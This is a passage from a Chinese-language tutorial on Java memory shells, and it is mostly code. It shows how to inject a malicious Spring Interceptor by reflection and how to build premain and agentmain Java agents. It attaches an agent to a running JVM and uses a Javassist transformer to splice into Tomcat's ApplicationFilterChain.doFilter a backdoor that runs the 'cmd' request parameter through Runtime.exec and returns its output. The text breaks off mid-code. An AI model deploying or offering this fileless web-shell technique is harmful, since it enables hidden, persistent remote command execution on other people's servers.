</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>   </span><span class=k>default</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>afterCompletion</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>handler</span><span class=p>,</span><span class=w> </span><span class=nd>@Nullable</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>   </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>与 <code>Controller</code>一样，<code>Interceptor</code>也是 <code>Bean</code>，由Spring的 <code>IOC容器</code>管理。</p><h5 id=-注册恶意-interceptor>Ⅰ. 注册恶意 Interceptor</h5><p>Spring 通过遍历 <code>adaptedInterceptors</code>属性值来执行所有 <code>Interceptor</code>，因此只需要将恶意 <code>Interceptor</code>加入到 <code>adaptedInterceptors</code> 属性即可完成动态注入 <code>Interceptor</code>。<code>adaptedInterceptors</code>属性是一个 <code>List&lt;HandlerInterceptor></code>，可以通过add()方添加 <code>Interceptor</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln>1</span><span class=cl><span class=w>        </span><span class=c1>// 假设已经获取到 ApplicationContext 对象</span><span class=w>
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=w>        </span><span class=c1>// 获取 adaptedInterceptors 属性值</span><span class=w>
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=w>        </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>web</span><span class=p>.</span><span class=na>servlet</span><span class=p>.</span><span class=na>handler</span><span class=p>.</span><span class=na>AbstractHandlerMapping</span><span class=w> </span><span class=n>abstractHandlerMapping</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>web</span><span class=p>.</span><span class=na>servlet</span><span class=p>.</span><span class=na>handler</span><span class=p>.</span><span class=na>AbstractHandlerMapping</span><span class=p>)</span><span class=n>context</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=n>RequestMappingHandlerMapping</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=w>        </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>web</span><span class=p>.</span><span class=na>servlet</span><span class=p>.</span><span class=na>handler</span><span class=p>.</span><span class=na>AbstractHandlerMapping</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;adaptedInterceptors&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=w>        </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>ArrayList</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>adaptedInterceptors</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>ArrayList</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=p>)</span><span class=n>field</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>abstractHandlerMapping</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=w> 
</span></span></span></code></pre></div><h2 id=0x02-agent型>0x02 Agent型</h2><h3 id=21-agent>2.1 Agent</h3><p>Java语言是编译型语言，所有的代码都需要编译为字节码之后交由 <code>JVM</code> 执行。Java agent技术是一种在Java代码编译后，通过修改字节码，从而实现动态修改类、属性以及方法的技术。</p><p>Agent大致分为两种，一种是在JVM启动前加载的 <code>premain-agent</code>，一种是在JVM启动后动态注入的 <code>agentmain-agent</code>。简单理解，前者需在启动JVM时指定参数并在应用程序main函数之前运行，后者在应用程序main函数运行之后随外部操作动态注入并马上运行。</p><h4 id=1-premain-agent示例>1) premain agent示例</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln>1</span><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.instrument.Instrumentation</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=w> 
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>AgentPremain</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>premain</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>args</span><span class=p>,</span><span class=w> </span><span class=n>Instrumentation</span><span class=w> </span><span class=n>inst</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=n>0</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>&lt;</span><span class=n>10</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;调用了premain-Agent！&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>9</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>按照如下方式填写配置文件，指定 <code>agent</code>入口类。编译为 <code>jar</code>文件。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=ln>1</span><span class=cl><span class=c># src\main\resources\META-INF\MANIFEST.MF</span><span class=w>
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=w></span><span class=nt>Manifest-Version</span><span class=p>:</span><span class=w> </span><span class=m>1.0</span><span class=w>
</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=w></span><span class=nt>Premain-Class</span><span class=p>:</span><span class=w> </span><span class=l>com.b5juan.memshell.agent.AgentPremain</span><span class=w>
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=w></span><span class=nt>Can-Redefine-Classes</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=w></span><span class=nt>Can-Retransform-Classes</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span></code></pre></div><p>运行主程序时，添加如下参数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-javaagent:<span class=s2>&#34;{path_to_jar}/AgentPremain.jar&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=2-agentmain-agent示例>2) agentmain agent示例</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// AgentMain.java</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=kn>package</span><span class=w> </span><span class=nn>com.b5juan.memshell.agent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.instrument.Instrumentation</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>AgentMain</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>agentmain</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>string</span><span class=p>,</span><span class=w> </span><span class=n>Instrumentation</span><span class=w> </span><span class=n>inst</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;调用了agentmain-Agent！&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>同理，配置文件如下，打包得到一个jar文件。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=ln>1</span><span class=cl><span class=c># src\main\resources\META-INF\MANIFEST.MF</span><span class=w>
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=w></span><span class=nt>Manifest-Version</span><span class=p>:</span><span class=w> </span><span class=m>1.0</span><span class=w>
</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=w></span><span class=nt>Agent-Class</span><span class=p>:</span><span class=w> </span><span class=l>com.b5juan.memshell.agent.AgentMain</span><span class=w>
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=w></span><span class=nt>Can-Redefine-Classes</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=w></span><span class=nt>Can-Retransform-Classes</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span></code></pre></div><h3 id=22-注入agentmain内存马>2.2 注入agentmain内存马</h3><p>以上，貌似已经获得了一个 <code>agentmain</code>类型的 <code>agent</code> <code>jar</code>包，实际离动态注入agentmain内存马还差两部分。</p><h4 id=1-注入agent>1) 注入agent</h4><p><code>com.sun.tools.attach</code> 是 Java 提供的一套工具，允许开发者从外部进程连接到运行中的 JVM 并执行一些操作。主要涉及两个类：<code>VirtualMachine</code> 和 <code>VirtualMachineDescriptor</code>。通过 <code>VirtualMachine</code> 类可以获取正在运行的JVM、连接到指定的JVM，以及在连接后执行加载agent等动作。<code>VirtualMachineDescriptor</code> 类主要用于获取JVM相关描述，包括JVM名称、PID等。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.b5juan.memshell</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.tools.attach.VirtualMachine</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.tools.attach.VirtualMachineDescriptor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.tools.attach.AttachNotSupportedException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.tools.attach.AgentLoadException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.tools.attach.AgentInitializationException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.List</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w></span><span class=c1>// import java.lang.reflect.*;</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>InjectAgent</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>AttachNotSupportedException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>AgentLoadException</span><span class=p>,</span><span class=w> </span><span class=n>AgentInitializationException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=p>,</span><span class=w> </span><span class=n>NoSuchFieldException</span><span class=p>,</span><span class=w> </span><span class=n>SecurityException</span><span class=p>,</span><span class=w> </span><span class=n>IllegalArgumentException</span><span class=p>,</span><span class=w> </span><span class=n>IllegalAccessException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>VirtualMachineDescriptor</span><span class=o>&gt;</span><span class=w> </span><span class=n>lists</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>VirtualMachine</span><span class=p>.</span><span class=na>list</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>        </span><span class=k>for</span><span class=p>(</span><span class=n>VirtualMachineDescriptor</span><span class=w> </span><span class=n>vmd</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>lists</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>vmd</span><span class=p>.</span><span class=na>displayName</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;com.b5juan.Main&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>		</span><span class=c1>// 从Java 9开始，JVM默认不再允许self-attach</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>		</span><span class=c1>// 从Java 11开始，进一步限制了对内部API的访问，通过反射修改ALLOW_ATTACH_SELF字段也变得不可行</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>                </span><span class=c1>// Class cls = Class.forName(&#34;sun.tools.attach.HotSpotVirtualMachine&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>                </span><span class=c1>// Field field = cls.getDeclaredField(&#34;ALLOW_ATTACH_SELF&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>                </span><span class=c1>// field.setAccessible(true);</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>                </span><span class=c1>// Field modifiersField = Field.class.getDeclaredField(&#34;modifiers&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>                </span><span class=c1>// modifiersField.setInt(field,field.getModifiers()&amp;~Modifier.FINAL);</span><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w>                </span><span class=c1>// field.setBoolean(null, true);</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w>                </span><span class=n>VirtualMachine</span><span class=w> </span><span class=n>virtualMachine</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>VirtualMachine</span><span class=p>.</span><span class=na>attach</span><span class=p>(</span><span class=n>vmd</span><span class=p>.</span><span class=na>id</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w>                </span><span class=n>virtualMachine</span><span class=p>.</span><span class=na>loadAgent</span><span class=p>(</span><span class=s>&#34;target/UniJWE-1.0-SNAPSHOT-jar-with-dependencies.jar&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w>                </span><span class=n>virtualMachine</span><span class=p>.</span><span class=na>detach</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>29</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h4 id=2-修改字节码>2) 修改字节码</h4><h5 id=instrumentation>Ⅰ.Instrumentation</h5><p>解决如何注入agent的问题后，剩下的问题是通过什么样的方式修改已经加载的字节码，包括类、属性、方法等。</p><p><code>Instrumentation</code> 是 Java 提供的一个高级功能，主要用于在运行时对类文件进行转换和操作，允许开发者在 JVM 启动后加载的类中插入额外的字节码或修改现有的字节码。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// AgentMain.java</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=kn>package</span><span class=w> </span><span class=nn>com.b5juan.memshell.agent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.instrument.Instrumentation</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.instrument.UnmodifiableClassException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>AgentMain</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>agentmain</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>string</span><span class=p>,</span><span class=w> </span><span class=n>Instrumentation</span><span class=w> </span><span class=n>inst</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>UnmodifiableClassException</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>classes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inst</span><span class=p>.</span><span class=na>getAllLoadedClasses</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>        </span><span class=k>for</span><span class=p>(</span><span class=n>Class</span><span class=w> </span><span class=n>cls</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>classes</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cls</span><span class=p>.</span><span class=na>getName</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>            </span><span class=c1>// if (cls.getName().equals(&#34;jakarta.servlet.FilterChain.doFilter&#34;)) {</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>                </span><span class=n>inst</span><span class=p>.</span><span class=na>addTransformer</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FilterTransformer</span><span class=p>(),</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>                </span><span class=n>inst</span><span class=p>.</span><span class=na>retransformClasses</span><span class=p>(</span><span class=n>cls</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p><code>addTransformer()</code>方法是 <code>Instrumentation</code> API的核心方法之一，通过该方法可以添加一个 <code>ClassFileTransformer</code>实例到当前JVM。 <code>ClassFileTransformer</code>接口有一个唯一方法——<code>transform()</code>，该方法用于对类进行各种操作，在每次定义或者重定义新类时都会调用。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// FilterTransformer.java</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=kn>package</span><span class=w> </span><span class=nn>com.b5juan.memshell.agent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.instrument.ClassFileTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.instrument.IllegalClassFormatException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.security.ProtectionDomain</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>FilterTransformer</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>ClassFileTransformer</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>ClassLoader</span><span class=w> </span><span class=n>loader</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>className</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>classBeingRedefined</span><span class=p>,</span><span class=w> </span><span class=n>ProtectionDomain</span><span class=w> </span><span class=n>protectionDomain</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>classfileBuffer</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IllegalClassFormatException</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>        </span><span class=k>try</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>            </span><span class=n>ClassPool</span><span class=w> </span><span class=n>classPool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>classBeingRedefined</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>                </span><span class=n>ClassClassPath</span><span class=w> </span><span class=n>ccp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ClassClassPath</span><span class=p>(</span><span class=n>classBeingRedefined</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>                </span><span class=n>classPool</span><span class=p>.</span><span class=na>appendClassPath</span><span class=p>(</span><span class=n>ccp</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>            </span><span class=n>CtClass</span><span class=w> </span><span class=n>ctClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>classPool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>            </span><span class=n>CtMethod</span><span class=w> </span><span class=n>ctMethod</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctClass</span><span class=p>.</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;doFilter&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>            </span><span class=n>ctMethod</span><span class=p>.</span><span class=na>insertBefore</span><span class=p>(</span><span class=s>&#34;jakarta.servlet.http.HttpServletRequest httpServletRequest = (jakarta.servlet.http.HttpServletRequest) request;\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>                        </span><span class=s>&#34;response.getWriter().println(\&#34;&lt;h1&gt;Hello, agentmain&lt;/h1&gt;\&#34;);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>                        </span><span class=s>&#34;String cmd = httpServletRequest.getParameter(\&#34;cmd\&#34;);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w>                        </span><span class=s>&#34;if (cmd != null){\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w>                        </span><span class=c1>// &#34;    response.getWriter().println(\&#34;Cmd is: \&#34; + cmd);\n&#34; +</span><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w>                        </span><span class=s>&#34;    Process process = Runtime.getRuntime().exec(cmd);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w>                        </span><span class=s>&#34;    java.io.BufferedReader bufferReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w>                        </span><span class=s>&#34;    String line;\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>29</span><span class=cl><span class=w>                        </span><span class=s>&#34;    while ((line = bufferReader.readLine()) != null){\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=w>                        </span><span class=s>&#34;        response.getWriter().println(line);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
